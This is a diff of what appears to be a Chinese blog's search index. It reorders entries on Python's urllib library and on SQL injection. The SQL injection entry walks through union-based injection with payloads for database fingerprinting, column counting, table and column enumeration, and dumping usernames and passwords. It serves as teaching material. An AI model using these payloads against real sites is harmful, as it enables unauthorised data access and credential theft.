@@ -31,229 +31,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Python3-urllib</title>
-    <url>//e28b0e650137.html</url>
-    <content><![CDATA[<h1 id="urllib库"><a href="#urllib库" class="headerlink" title="urllib库"></a>urllib库</h1><h2 id="request"><a href="#request" class="headerlink" title="request"></a>request</h2><h3 id="urlopen"><a href="#urlopen" class="headerlink" title="urlopen"></a>urlopen</h3><p><code>urllib.request.urlope()</code>参数用于对目标<code>URL</code>的访问</p>
-<p>语法：</p>
-<p><strong>urllib.request.urlopen(url, data=None, [timeout, ]*, cafile=None, capath=None, cadefault=False, context=None)</strong></p>
-<ul>
-<li><p><strong>url</strong>: 目标资源在网络中的位置，可以是一个表示URL的字符串，也可以是一个<code>urllib.request</code>对象</p>
-</li>
-<li><p><strong>data</strong>: 用来指明发送服务器请求中的额外的参数信息，data默认是<code>None</code>,当给出<code>data</code>参数时,传参变成<code>POST</code></p>
-</li>
-<li><p><code>data</code>必须是<code>bytes</code>（字节流）类型，如果是字典，可以用<code>urllib.parse</code>模块里的<code>urlencode()</code>编码</p>
-</li>
-<li><p><strong>timeout</strong>: 设置网站的访问超时时间，仅适用于HTTP，HTTPS和FTP连接</p>
-</li>
-<li><p><strong>context</strong>: 实现SSL加密传输，必须是<code>ssl.SSLContext</code>类型</p>
-</li>
-<li><p><strong>cafile</strong>: 指定CA证书</p>
-</li>
-<li><p><strong>capath</strong>: 指定CA证书的路径</p>
-</li>
-<li><p><strong>cadefault</strong>: 已经废弃，默认为<code>False</code></p>
-</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://httpbin.org/post&#x27;</span></span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="number">1</span>:<span class="string">&#x27;A&#x27;</span>&#125;</span><br><span class="line">data = <span class="built_in">bytes</span>(urllib.parse.urlencode(<span class="built_in">dict</span>),encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">response = urllib.request.urlopen(url,data=data,timeout=<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="request-1"><a href="#request-1" class="headerlink" title="request"></a>request</h3><p><code>urllib.request.Request</code>用于构建一个请求</p>
-<p>语法：</p>
-<p><strong>urllib.request.Request(url, data=None, headers={}, origin_req_host=None, unverifiable=False, method=None)</strong></p>
-<ul>
-<li><p><strong>url</strong>: 目标资源在网络中的位置，可以是一个表示URL的字符串，也可以是一个<code>urllib.request</code>对象</p>
-</li>
-<li><p><strong>data</strong>: 用来指明发送服务器请求中的额外的参数信息，data默认是<code>None</code>,<code>data</code>必须是<code>bytes</code>（字节流）类型，如果是字典，可以用<code>urllib.parse</code>模块里的<code>urlencode()</code>编码</p>
-</li>
-<li><p><strong>headers</strong>: 用来构造请求头，也可以通过请求实例的<code>add_header()</code>方法添加</p>
-</li>
-<li><p><strong>method</strong>: 指定请求使用的方法</p>
-</li>
-<li><p><strong>origin_req_host</strong>: 指定请求方的host名称或者是IP地址</p>
-</li>
-<li><p><strong>unverifiable</strong>: 设置网页是否需要验证，默认是<code>False</code></p>
-</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://httpbin.org/post&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;httpbin.org&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="number">1</span>:<span class="string">&#x27;A&#x27;</span>&#125;</span><br><span class="line">data = <span class="built_in">bytes</span>(urllib.parse.urlencode(<span class="built_in">dict</span>),encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">req = urllib.request.Request(url=url,data=data,headers=headers,method=<span class="string">&#x27;POST&#x27;</span>)</span><br><span class="line"><span class="comment"># 这里也可以使用 add_header 添加headers</span></span><br><span class="line"><span class="comment"># req = urllib.request.Request(url=url,data=data,method=&#x27;POST&#x27;)</span></span><br><span class="line"><span class="comment"># req.add_header(&#x27;User-Agent&#x27;,&#x27;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&#x27;)</span></span><br><span class="line"><span class="comment"># req.add_header(&#x27;Host&#x27;,&#x27;httpbin.org&#x27;)</span></span><br><span class="line">response = urllib.request.urlopen(req)</span><br><span class="line"><span class="built_in">print</span>(response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="BaseHandler"><a href="#BaseHandler" class="headerlink" title="BaseHandler"></a>BaseHandler</h3><p><code>urllib.request.BaseHandler</code>用来构造Request的一些高级特性</p>
-<h2 id="response"><a href="#response" class="headerlink" title="response"></a>response</h2><p>urlopen返回对象提供方法：</p>
-<p>read() , readline() ,readlines() , fileno() , close() ：对HTTPResponse类型数据进行操作</p>
-<p>info()：返回HTTPMessage对象，表示远程服务器返回的头信息</p>
-<p>getcode()：返回Http状态码。如果是http请求，200请求成功完成;404网址未找到</p>
-<p>geturl()：返回请求的url</p>
-<h2 id="parse"><a href="#parse" class="headerlink" title="parse"></a>parse</h2><h3 id="urlparse"><a href="#urlparse" class="headerlink" title="urlparse"></a>urlparse</h3><p><code>urllib.parse.urlparse</code>用于解析URL</p>
-<p>语法：</p>
-<p><strong>urllib.parse.urlparse(urlstring, scheme=’’, allow_fragments=True)</strong></p>
-<ul>
-<li><strong>urlstring</strong>: 表示字符串的url地址</li>
-<li><strong>scheme</strong>: 表示协议类型</li>
-<li><strong>allow_fragments</strong>: 默认为<code>True</code>，如果为<code>False</code>则无法识别片段标识符，返回<code>fragment=&#39;&#39;</code></li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;http://python.org/学习/index?a=1&#x27;</span></span><br><span class="line">Result = urllib.parse.urlparse(key)</span><br><span class="line"><span class="built_in">print</span>(Result)</span><br><span class="line"></span><br><span class="line">ParseResult(scheme=<span class="string">&#x27;http&#x27;</span>, netloc=<span class="string">&#x27;python.org&#x27;</span>, path=<span class="string">&#x27;/学习/index&#x27;</span>, params=<span class="string">&#x27;&#x27;</span>, query=<span class="string">&#x27;a=1&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># 其中scheme是协议，netloc是域名，path是路径，params是参数，query是查询的条件，fragment是片段</span></span><br><span class="line"><span class="comment"># 也可以单独输出</span></span><br><span class="line"><span class="built_in">print</span>(Result.scheme)</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="quote"><a href="#quote" class="headerlink" title="quote"></a>quote</h3><p>对URL进行编码</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&#x27;http://python.org/学习&#x27;</span></span><br><span class="line">key1 = urllib.parse.quote(key)</span><br><span class="line"><span class="built_in">print</span>(key1)</span><br><span class="line"></span><br><span class="line">http%3A//python.org/%E5%AD%A6%E4%B9%A0</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="unquote"><a href="#unquote" class="headerlink" title="unquote"></a>unquote</h3><p>对URL进行解码</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&#x27;http://python.org/学习&#x27;</span></span><br><span class="line">key1 = urllib.parse.quote(key)</span><br><span class="line">key2 = urllib.parse.unquote(key1)</span><br><span class="line"><span class="built_in">print</span>(key2)</span><br><span class="line"></span><br><span class="line">http://python.org/学习</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="robotparser"><a href="#robotparser" class="headerlink" title="robotparser"></a>robotparser</h2><h2 id="error"><a href="#error" class="headerlink" title="error"></a>error</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    urllib.request.urlopen(url)</span><br><span class="line">except urllib.error.URLError as e:</span><br><span class="line">    print(e.reason)</span><br><span class="line">    print(e.status)</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Python3</category>
-      </categories>
-      <tags>
-        <tag>Python库</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL注入漏洞</title>
-    <url>//9958bd672d7e.html</url>
-    <content><![CDATA[<h2 id="SQL注入漏洞简介"><a href="#SQL注入漏洞简介" class="headerlink" title="SQL注入漏洞简介"></a>SQL注入漏洞简介</h2><p>​        SQL 注入（SQL Injection）是发生在 Web 程序中数据库层的安全漏洞，是网站存在最多也是最简单的漏洞。主要原因是程序对用户输入数据的合法性没有判断和处理，导致攻击者可以在 Web 应用程序中事先定义好的 SQL 语句中添加额外的 SQL 语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步获取到数据信息。</p>
-<h3 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h3><p>一段MySQL查询数据为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from user where user_id &#x3D; &#39;1&#39;</span><br></pre></td></tr></table></figure>
-
-<p>这一段代码的意思是，查询<code>user</code>表中<code>user_id</code>字段的值为1的所有数据</p>
-<p>其中1是我们可以改变的地方，在不做任何防御措施下，我们将其改成我们构造的语句，从而造成SQL注入</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from user where user_id &#x3D; &#39;1&#39; or 1 &#x3D; 1 --+</span><br></pre></td></tr></table></figure>
-
-<p>改变之后，这段代码的意思就变成了查询<code>user</code>表中<code>user_id</code>字段的值为1或者<code>1=1</code>的所有数据</p>
-<p>由于<code>1=1</code>的结果为真，所以最后的结果就是查询<code>user</code>表中的所有数据</p>
-<p>这里我们手动填写的语句就是<code>1&#39; or 1 = 1 --+</code></p>
-<p>其中<code>1&#39;</code>闭合之前的语句，在通过<code>or 1 = 1</code>造成结果为真的判断</p>
-<p>再通过注释符号<code>--</code>注释掉代码后边可能存在的其他语句，避免查询的结果与我们预期的结果不同</p>
-<p>最后通过符号<code>+</code>来表示空格，避免注释符号<code>--</code>与之后的单引号连接导致出错，这样一段SQL注入就产生了</p>
-<p><strong>在MySQL5.0以下</strong>，没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</p>
-<p><strong>在MySQL5.0以上</strong>，MySQL中默认添加了一个名为 information_schema 的数据库，该数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。</p>
-<p><strong>information_schema数据库中三个很重要的表：</strong></p>
-<p><strong>information_schema.schemata</strong>:  该数据表存储了mysql数据库中的所有数据库的库名<br><strong>information_schema.tables</strong>：     该数据表存储了mysql数据库中的所有数据表的表名<br><strong>information_schema.columns</strong>:    该数据表存储了mysql数据库中的所有列的列名</p>
-<h3 id="SQL注入特征"><a href="#SQL注入特征" class="headerlink" title="SQL注入特征"></a>SQL注入特征</h3><p><strong>任何传输参数的地方都有可能造成SQL注入</strong></p>
-<p><strong>任何传输参数的地方都有可能造成SQL注入</strong></p>
-<p><strong>任何传输参数的地方都有可能造成SQL注入</strong></p>
-<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><ul>
-<li>database()：当前数据库</li>
-<li>user()：查询数据库的用户</li>
-<li>version()：查询数据库版本</li>
-<li>system_user()：系统用户名</li>
-<li>session_user()：链接数据库的用户名</li>
-<li>current_user：当前用户名</li>
-<li>load_file()：读取本地文件</li>
-<li>@@datadir：读取数据库路径</li>
-<li>@@basedir：MySQL安装路径</li>
-<li>@@version_complie_os：查看操作系统</li>
-</ul>
-<h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><p><strong>依据注入点类型分类</strong></p>
-<ul>
-<li>数字类型的注入</li>
-<li>字符类型的注入</li>
-<li>搜索类型的注入</li>
-</ul>
-<p><strong>依据提交方式分类</strong></p>
-<ul>
-<li>GET注入</li>
-<li>POST注入</li>
-<li>COOKIE注入</li>
-<li>HTTP头注入（XFF注入、UA注入、REFERER注入）</li>
-</ul>
-<p><strong>依据获取信息的方式分类</strong></p>
-<ul>
-<li>基于布尔的盲注</li>
-<li>基于时间的盲注</li>
-<li>基于报错的盲注</li>
-<li>联合查询注入</li>
-<li>堆查询注入（可同时执行多条语句）</li>
-</ul>
-<h3 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h3><table>
-<thead>
-<tr>
-<th align="center">数据库</th>
-<th align="center">指纹</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">MySQL</td>
-<td align="center">information_schema.tables</td>
-</tr>
-<tr>
-<td align="center">Access</td>
-<td align="center">msysobjects</td>
-</tr>
-<tr>
-<td align="center">SQL server</td>
-<td align="center">sysobjects</td>
-</tr>
-<tr>
-<td align="center">Oracle</td>
-<td align="center">dual</td>
-</tr>
-</tbody></table>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;判断MySQL数据库</span><br><span class="line">xxx?id&#x3D;1 and exists(select * from information_schema.tables) --+</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;判断Access数据库 </span><br><span class="line">xxx?id&#x3D;1 and exists(select * from msysobjects) --+</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;判断Mssql数据库</span><br><span class="line">xxx?id&#x3D;1 and exists(select * from sysobjects) --+</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;判断Oracle数据库</span><br><span class="line">xxx?id&#x3D;1 and (select count(*) from dual)&gt;0 --+</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="Union联合查询注入"><a href="#Union联合查询注入" class="headerlink" title="Union联合查询注入"></a>Union联合查询注入</h2><h3 id="判断闭合符号"><a href="#判断闭合符号" class="headerlink" title="判断闭合符号"></a>判断闭合符号</h3><p>当我们找到一个注入点时，首先判断该注入点中可能存在的闭合符号</p>
-<p>无闭合，单引号<code>&#39;&#39;</code>,双引号<code>&quot;&quot;</code>,括号<code>()</code>,单引号+括号<code>(&#39;&#39;)</code>,双引号+括号<code>(&quot;&quot;)</code>….以及<code>引号+多括号</code>组合</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1</span><br><span class="line">如果报错说明可能存在注入</span><br><span class="line"></span><br><span class="line">xxx?id &#x3D; 1 and 1 &#x3D; 2 --+</span><br><span class="line">如果不报错，说明不是数字型注入</span><br><span class="line"></span><br><span class="line">xxx?id &#x3D; 1’ and 1 &#x3D; 2 --+</span><br><span class="line">如果报错，说明闭合含有单引号，如果不报错，说明闭合含有双引号</span><br><span class="line">然后通过构造语句能否成功执行判断具体的闭合组合情况</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; 1&#39; order by 5 --+</span><br></pre></td></tr></table></figure>
-
-<p>通过语句<code>order by x</code>来判断字段的数量</p>
-<p>如果不报错，说明字段数量大于等于5，如果报错，说明字段数量小于5</p>
-<h3 id="判断数据显示位置"><a href="#判断数据显示位置" class="headerlink" title="判断数据显示位置"></a>判断数据显示位置</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1&#39; union select 1,2,3,4... --+ </span><br></pre></td></tr></table></figure>
-
-<p>这里先通过负号<code>-</code>或者<code>and 1 = 2</code>使得数据库报错</p>
-<p>再通过<code>union</code>建立联合查询，也就是在<code>select</code>查询里面再嵌套一个查询语句</p>
-<p>后面的数值排列取决于判断的字段数量</p>
-<p>若回显中出现了相应的数值说明我们接下来查询的信息会在该位置显示</p>
-<p>如图下的2和3可能会在网页中显现出来</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqxkgro2qj60o804iabv02.jpg" alt="SQL注入1.png"></p>
-<h3 id="查询数据库库名"><a href="#查询数据库库名" class="headerlink" title="查询数据库库名"></a>查询数据库库名</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1&#39; union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
-
-<p><code>database()</code>是MySQL中的一个函数，表示当前数据库的名字</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqxw3ux3yj60ps04ggnl02.jpg" alt="SQL注入2.png"></p>
-<h3 id="枚举数据库中的所有的表"><a href="#枚举数据库中的所有的表" class="headerlink" title="枚举数据库中的所有的表"></a>枚举数据库中的所有的表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema &#x3D; database() --+</span><br></pre></td></tr></table></figure>
-
-<p>这个语句的意思是从<code>information_schema</code>的<code>table-schema</code>表中查找当前数据库的所有表</p>
-<p><code>information_schema</code>：MySQL的默认数据库，包含了所有数据库，数据表的信息</p>
-<p><code>table_schema</code>：默认数据库中的一个表，记录了数据库名字</p>
-<p><code>table_name</code>：默认数据库中的一个表，记录了数据表的名字</p>
-<p><code>group_concat()</code>：是MySQL的函数，把函数中字段的值输出在一行中，以逗号分隔</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqyv8akyuj60xj04qgp102.jpg" alt="SQL注入3.png"></p>
-<h3 id="枚举数据表中所有的字段"><a href="#枚举数据表中所有的字段" class="headerlink" title="枚举数据表中所有的字段"></a>枚举数据表中所有的字段</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema &#x3D; databese() and table_name &#x3D; &#39;user&#39; --+</span><br></pre></td></tr></table></figure>
-
-<p>这个语句的意思是从<code>information_schema</code>中条件为当前数据表并且当前数据库中的<code>user</code>表中所有字段的名字</p>
-<p><code>column_name</code>：MySQL的默认数据库中的一个表，记录了字段的名字</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqyvpxte8j60xg04qq6p02.jpg" alt="SQL注入4.png"></p>
-<h3 id="查询字段中所有的值"><a href="#查询字段中所有的值" class="headerlink" title="查询字段中所有的值"></a>查询字段中所有的值</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx?id &#x3D; -1&#39; union select 1,group_concat(concat_ws(0x2d,username,password)),3 from user --+</span><br></pre></td></tr></table></figure>
-
-<p>这个语句的意思是查询<code>user</code>表中<code>username</code>字段和<code>password</code>的值</p>
-<p><code>concat_ws</code>：MySQL的函数，为了格式化数据，看起来整齐，通过第一个参数连接后面所有参数</p>
-<p><code>0x2d</code>：ASCII码，代表<code>-</code></p>
-<p>最后输出格式为<code>user1-pass1</code>,<code>user2-pass2</code>…..</p>
-<h2 id="Boolean盲注"><a href="#Boolean盲注" class="headerlink" title="Boolean盲注"></a>Boolean盲注</h2><p>盲注，通常是在服务器没有回显错误信息，所以攻击者找到验证注入的SQL语句是否执行的方法</p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>常见漏洞</category>
-      </categories>
-      <tags>
-        <tag>注入类漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Spring Boot Autuator未授权访问</title>
     <url>//10d5c6245bbe.html</url>
     <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>​        Actuator 是 Spring Boot 提供的服务监控和管理中间件。当 Spring Boot 应用程序运行时，它会自动将多个端点注册到路由进程中。默认配置会出现接口未授权访问，部分接口会泄露网站流量信息和内存信息等，使用Jolokia库特性甚至可以远程执行任意代码，获取服务器权限</p>
@@ -541,6 +318,93 @@
       </tags>
   </entry>
   <entry>
+    <title>Python3-urllib</title>
+    <url>//e28b0e650137.html</url>
+    <content><![CDATA[<h1 id="urllib库"><a href="#urllib库" class="headerlink" title="urllib库"></a>urllib库</h1><h2 id="request"><a href="#request" class="headerlink" title="request"></a>request</h2><h3 id="urlopen"><a href="#urlopen" class="headerlink" title="urlopen"></a>urlopen</h3><p><code>urllib.request.urlope()</code>参数用于对目标<code>URL</code>的访问</p>
+<p>语法：</p>
+<p><strong>urllib.request.urlopen(url, data=None, [timeout, ]*, cafile=None, capath=None, cadefault=False, context=None)</strong></p>
+<ul>
+<li><p><strong>url</strong>: 目标资源在网络中的位置，可以是一个表示URL的字符串，也可以是一个<code>urllib.request</code>对象</p>
+</li>
+<li><p><strong>data</strong>: 用来指明发送服务器请求中的额外的参数信息，data默认是<code>None</code>,当给出<code>data</code>参数时,传参变成<code>POST</code></p>
+</li>
+<li><p><code>data</code>必须是<code>bytes</code>（字节流）类型，如果是字典，可以用<code>urllib.parse</code>模块里的<code>urlencode()</code>编码</p>
+</li>
+<li><p><strong>timeout</strong>: 设置网站的访问超时时间，仅适用于HTTP，HTTPS和FTP连接</p>
+</li>
+<li><p><strong>context</strong>: 实现SSL加密传输，必须是<code>ssl.SSLContext</code>类型</p>
+</li>
+<li><p><strong>cafile</strong>: 指定CA证书</p>
+</li>
+<li><p><strong>capath</strong>: 指定CA证书的路径</p>
+</li>
+<li><p><strong>cadefault</strong>: 已经废弃，默认为<code>False</code></p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://httpbin.org/post&#x27;</span></span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="number">1</span>:<span class="string">&#x27;A&#x27;</span>&#125;</span><br><span class="line">data = <span class="built_in">bytes</span>(urllib.parse.urlencode(<span class="built_in">dict</span>),encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">response = urllib.request.urlopen(url,data=data,timeout=<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="request-1"><a href="#request-1" class="headerlink" title="request"></a>request</h3><p><code>urllib.request.Request</code>用于构建一个请求</p>
+<p>语法：</p>
+<p><strong>urllib.request.Request(url, data=None, headers={}, origin_req_host=None, unverifiable=False, method=None)</strong></p>
+<ul>
+<li><p><strong>url</strong>: 目标资源在网络中的位置，可以是一个表示URL的字符串，也可以是一个<code>urllib.request</code>对象</p>
+</li>
+<li><p><strong>data</strong>: 用来指明发送服务器请求中的额外的参数信息，data默认是<code>None</code>,<code>data</code>必须是<code>bytes</code>（字节流）类型，如果是字典，可以用<code>urllib.parse</code>模块里的<code>urlencode()</code>编码</p>
+</li>
+<li><p><strong>headers</strong>: 用来构造请求头，也可以通过请求实例的<code>add_header()</code>方法添加</p>
+</li>
+<li><p><strong>method</strong>: 指定请求使用的方法</p>
+</li>
+<li><p><strong>origin_req_host</strong>: 指定请求方的host名称或者是IP地址</p>
+</li>
+<li><p><strong>unverifiable</strong>: 设置网页是否需要验证，默认是<code>False</code></p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://httpbin.org/post&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;httpbin.org&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="number">1</span>:<span class="string">&#x27;A&#x27;</span>&#125;</span><br><span class="line">data = <span class="built_in">bytes</span>(urllib.parse.urlencode(<span class="built_in">dict</span>),encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">req = urllib.request.Request(url=url,data=data,headers=headers,method=<span class="string">&#x27;POST&#x27;</span>)</span><br><span class="line"><span class="comment"># 这里也可以使用 add_header 添加headers</span></span><br><span class="line"><span class="comment"># req = urllib.request.Request(url=url,data=data,method=&#x27;POST&#x27;)</span></span><br><span class="line"><span class="comment"># req.add_header(&#x27;User-Agent&#x27;,&#x27;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&#x27;)</span></span><br><span class="line"><span class="comment"># req.add_header(&#x27;Host&#x27;,&#x27;httpbin.org&#x27;)</span></span><br><span class="line">response = urllib.request.urlopen(req)</span><br><span class="line"><span class="built_in">print</span>(response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="BaseHandler"><a href="#BaseHandler" class="headerlink" title="BaseHandler"></a>BaseHandler</h3><p><code>urllib.request.BaseHandler</code>用来构造Request的一些高级特性</p>
+<h2 id="response"><a href="#response" class="headerlink" title="response"></a>response</h2><p>urlopen返回对象提供方法：</p>
+<p>read() , readline() ,readlines() , fileno() , close() ：对HTTPResponse类型数据进行操作</p>
+<p>info()：返回HTTPMessage对象，表示远程服务器返回的头信息</p>
+<p>getcode()：返回Http状态码。如果是http请求，200请求成功完成;404网址未找到</p>
+<p>geturl()：返回请求的url</p>
+<h2 id="parse"><a href="#parse" class="headerlink" title="parse"></a>parse</h2><h3 id="urlparse"><a href="#urlparse" class="headerlink" title="urlparse"></a>urlparse</h3><p><code>urllib.parse.urlparse</code>用于解析URL</p>
+<p>语法：</p>
+<p><strong>urllib.parse.urlparse(urlstring, scheme=’’, allow_fragments=True)</strong></p>
+<ul>
+<li><strong>urlstring</strong>: 表示字符串的url地址</li>
+<li><strong>scheme</strong>: 表示协议类型</li>
+<li><strong>allow_fragments</strong>: 默认为<code>True</code>，如果为<code>False</code>则无法识别片段标识符，返回<code>fragment=&#39;&#39;</code></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;http://python.org/学习/index?a=1&#x27;</span></span><br><span class="line">Result = urllib.parse.urlparse(key)</span><br><span class="line"><span class="built_in">print</span>(Result)</span><br><span class="line"></span><br><span class="line">ParseResult(scheme=<span class="string">&#x27;http&#x27;</span>, netloc=<span class="string">&#x27;python.org&#x27;</span>, path=<span class="string">&#x27;/学习/index&#x27;</span>, params=<span class="string">&#x27;&#x27;</span>, query=<span class="string">&#x27;a=1&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># 其中scheme是协议，netloc是域名，path是路径，params是参数，query是查询的条件，fragment是片段</span></span><br><span class="line"><span class="comment"># 也可以单独输出</span></span><br><span class="line"><span class="built_in">print</span>(Result.scheme)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="quote"><a href="#quote" class="headerlink" title="quote"></a>quote</h3><p>对URL进行编码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&#x27;http://python.org/学习&#x27;</span></span><br><span class="line">key1 = urllib.parse.quote(key)</span><br><span class="line"><span class="built_in">print</span>(key1)</span><br><span class="line"></span><br><span class="line">http%3A//python.org/%E5%AD%A6%E4%B9%A0</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="unquote"><a href="#unquote" class="headerlink" title="unquote"></a>unquote</h3><p>对URL进行解码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&#x27;http://python.org/学习&#x27;</span></span><br><span class="line">key1 = urllib.parse.quote(key)</span><br><span class="line">key2 = urllib.parse.unquote(key1)</span><br><span class="line"><span class="built_in">print</span>(key2)</span><br><span class="line"></span><br><span class="line">http://python.org/学习</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="robotparser"><a href="#robotparser" class="headerlink" title="robotparser"></a>robotparser</h2><h2 id="error"><a href="#error" class="headerlink" title="error"></a>error</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    urllib.request.urlopen(url)</span><br><span class="line">except urllib.error.URLError as e:</span><br><span class="line">    print(e.reason)</span><br><span class="line">    print(e.status)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Python3</category>
+      </categories>
+      <tags>
+        <tag>Python库</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>shiro反序列化</title>
     <url>//50f501257ce7.html</url>
     <content><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>​        Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。</p>
@@ -569,6 +433,142 @@
       </categories>
       <tags>
         <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入漏洞</title>
+    <url>//9958bd672d7e.html</url>
